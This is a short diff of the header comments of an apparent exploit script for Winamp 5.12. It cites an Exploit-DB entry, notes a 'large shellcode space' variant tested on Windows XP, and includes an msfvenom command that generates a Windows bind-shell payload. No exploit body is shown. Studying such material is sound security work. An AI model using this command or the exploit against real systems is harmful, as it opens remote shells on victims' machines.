@@ -2,7 +2,8 @@
 
 # Winamp 5.12
 # Original exploit and vulnerable app available at: https://www.exploit-db.com/exploits/3422
-# Exploit tested on Windows XP Pro SP3 FR
+# This a version with large shellcode space
+# Exploit tested on Windows XP Pro SP3 FR (may be exploitable on Windows 7)
 
 
 # msfvenom -p windows/shell_bind_tcp -b '\x00\x0a\x0d\x2e\x5c' -f python -v shellcode
